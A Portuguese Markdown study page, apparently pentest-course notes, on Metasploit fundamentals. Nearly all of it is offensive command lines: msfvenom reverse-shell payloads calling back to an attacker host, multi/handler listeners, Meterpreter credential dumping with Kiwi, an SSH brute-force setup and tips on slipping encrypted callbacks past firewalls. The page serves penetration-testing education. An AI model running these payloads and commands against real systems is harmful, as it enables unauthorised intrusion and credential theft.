---
layout: cyber
section: fundamentos
title: "Metasploit Framework — Fundamentos"
---

# 07 - Metasploit Framework — Fundamentos

> Framework de exploração com database integrado, workspaces e payloads para todo ciclo de ataque.

---

## Inicialização

```bash
sudo msfdb init                    # inicializar banco PostgreSQL (primeira vez)
sudo systemctl enable postgresql   # persistir entre reboots
sudo msfconsole                    # iniciar

# Verificar conexão com banco
msf6 > db_status
# [*] Connected to msf. Connection type: postgresql.
```

---

## Workspaces — Isolar Engagements

```bash
workspace                    # listar workspaces
workspace -a pen200          # criar workspace "pen200"
workspace pen200             # selecionar
workspace -d pen200          # deletar
```

Cada workspace tem hosts, serviços, credenciais e vulnerabilidades independentes — separar por cliente/engagement.

---

## Banco de Dados — Salvar Resultados

```bash
# Nmap integrado — salva resultados automaticamente
db_nmap -A 192.168.50.0/24
db_nmap -sS -sV -p- 192.168.50.10

# Consultar
hosts                        # hosts descobertos
hosts -c address,os_name     # colunas específicas
services                     # serviços
services -p 445              # filtrar por porta
services -p 445 --rhosts     # setar RHOSTS com hosts que têm porta 445
vulns                        # vulnerabilidades
creds                        # credenciais coletadas
```

---

## Categorias de Módulos

| Categoria | Função |
|-----------|--------|
| `auxiliary` | Scan, enumeração, brute force — sem exploração |
| `exploits` | Exploração de vulnerabilidades |
| `payloads` | Shellcode enviado após exploit bem-sucedido |
| `post` | Pós-exploração em sessions abertas |
| `encoders` | Ofuscação de payloads |
| `evasion` | Bypass de AV/EDR |
| `nops` | NOP sleds para buffer overflows |

---

## Workflow de Módulo

```bash
# 1. Buscar
search type:auxiliary smb
search type:exploit apache 2.4
search cve:2017-0144
search platform:windows type:exploit rank:excellent

# 2. Ativar
use 56                                          # por índice
use auxiliary/scanner/smb/smb_ms17_010         # por path completo

# 3. Inspecionar
info                 # descrição, confiabilidade, exemplos
show options         # todas as opções + valores atuais
show missing         # apenas opções obrigatórias não setadas

# 4. Configurar
set RHOSTS 192.168.50.0/24
set LHOST 192.168.50.100
set THREADS 10

# 5. Executar
run                  # ou 'exploit'
check                # verificar vulnerabilidade sem explorar (se suportado)
back                 # voltar ao contexto anterior
```

---

## Staged vs Non-Staged

### Non-Staged (Inline) — underline `_` no nome

Payload completo em um único envio. Mais estável — sem dependência de second stage.

```
shell_reverse_tcp        → non-staged
meterpreter_reverse_tcp  → non-staged
```

Funciona com netcat (`nc -nlvp PORT`) ou multi/handler.

### Staged — barra `/` no nome

Primeiro stage (~38 bytes) conecta de volta e baixa o segundo stage completo.

```
shell/reverse_tcp        → staged
meterpreter/reverse_tcp  → staged
```

- Menor tamanho inicial → útil em buffer overflows com espaço limitado
- **Requer multi/handler** — netcat não implementa o handshake de staging

```
15  shell/reverse_tcp       → staged   (barra)
20  shell_reverse_tcp       → non-staged (underline)
11  meterpreter/reverse_tcp → staged Meterpreter
```

---

## msfvenom — Gerar Payloads

```bash
# Listar payloads
msfvenom -l payloads --platform windows --arch x64
msfvenom -l formats

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.50.100 LPORT=443 -f exe -o met.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f elf -o payload.elf

# Shellcode em C (para injeção em PoC de exploit)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f c

# PowerShell in-memory
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f powershell1

# Evitar bad chars
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -b "\x00\x0a"
```

Formatos disponíveis: `exe`, `elf`, `raw`, `c`, `python`, `powershell1`, `asp`, `aspx`, `dll`

---

## multi/handler — Listener para Staged e Meterpreter

```bash
use multi/handler

set payload windows/x64/meterpreter_reverse_https
set LHOST 192.168.50.100
set LPORT 443

run         # foreground
run -j      # background como job
```

Quando staged payload conecta → multi/handler envia second stage → session abre.

---

## Meterpreter — Comandos Essenciais

```bash
# Sistema
sysinfo          # OS, hostname, arquitetura
getuid           # usuário atual
getpid           # PID do Meterpreter
ps               # listar processos
shell            # shell nativa
idletime         # segundos desde último input (OPSEC: alta inatividade = usuário ausente)

# Filesystem
ls / cd / pwd / cat
download C:\\Users\\admin\\ntds.dit /tmp/
upload /tmp/tool.exe C:\\Windows\\Temp\\

# Navegação entre sessions
background       # colocar session em background
sessions -l      # listar sessions ativas
sessions -i 2    # interagir com session 2
sessions -k 2    # encerrar session 2

# Escalar privilégio
getsystem        # Named Pipe Impersonation (requer SeImpersonatePrivilege)

# Migrar processo
migrate PID      # migrar para processo estável (explorer.exe, svchost.exe)
```

### Kiwi (Mimikatz Integrado)

```bash
load kiwi
hashdump          # hashes locais
lsa_dump_sam      # SAM database
creds_all         # hashes + tickets Kerberos + plaintext
```

### meterpreter_reverse_https — Evasão

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=443 -f exe -o met_https.exe
```

- Tráfego encriptado via TLS → difícil de bloquear em firewalls corporativos
- GET para porta 443 → parece HTTPS legítimo
- `User-Agent` configurável para imitar browser

---

## Sessions e Jobs

```bash
sessions -l      # listar
sessions -i 2    # interagir com session 2
sessions -k 2    # encerrar session 2
sessions -K      # encerrar todas

run -j           # executar exploit em background
jobs             # listar jobs
jobs -k JOB_ID   # encerrar job
```

---

## Módulos Auxiliary Úteis

```bash
# SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/smb/smb_enumshares

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.50.10 ; set USERNAME george ; set PASS_FILE rockyou.txt
set STOP_ON_SUCCESS true ; set THREADS 4 ; run

# HTTP
use auxiliary/scanner/http/title

# Port scan
use auxiliary/scanner/portscan/tcp
set PORTS 1-1000 ; set RHOSTS 192.168.50.0/24 ; run
```

---

## Flags Globais

```bash
setg LHOST 192.168.50.100    # persistir entre módulos
setg RHOSTS 192.168.50.0/24
unsetg LHOST
save                         # persistir configurações em arquivo
```

---

## Módulos Relacionados

`06_exploits_e_ferramentas.md` cobre o caminho alternativo quando MSF não tem módulo pro CVE — adaptar PoC público manualmente. `06_pos_exploracao_windows/` aprofunda pós-exploração com Meterpreter (token, credenciais, persistência). `04_evasao/` é obrigatório encadear quando o ambiente tem EDR, já que payloads MSF padrão são detectados imediatamente.
